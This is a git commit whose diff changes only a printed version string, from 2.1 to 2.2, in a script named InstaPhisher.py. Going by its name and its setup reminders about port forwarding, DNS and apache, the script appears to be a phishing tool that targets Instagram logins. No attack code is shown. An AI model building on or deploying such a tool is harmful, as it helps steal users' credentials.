5f6cb2dbe08056e1032700d082030d34be4cd080
ExilasP <57598719+ExilasP@users.noreply.github.com>
2020-06-30 14:52:57 +0200

    Update InstaPhisher.py

--- InstaPhisher.py
+++ InstaPhisher.py
@@ -17,7 +17,7 @@ def menu():
 	print('[i] Make sure you have make port forwarding')
 	print('[i] Make sure you have configured your DNS')
 	print('[i] Make sure you have started apache')
-	print('\nExilas // InstaPhisher // Version 2.1')
+	print('\nExilas // InstaPhisher // Version 2.2')
 	print('----------------------------------------------------------')
 
 
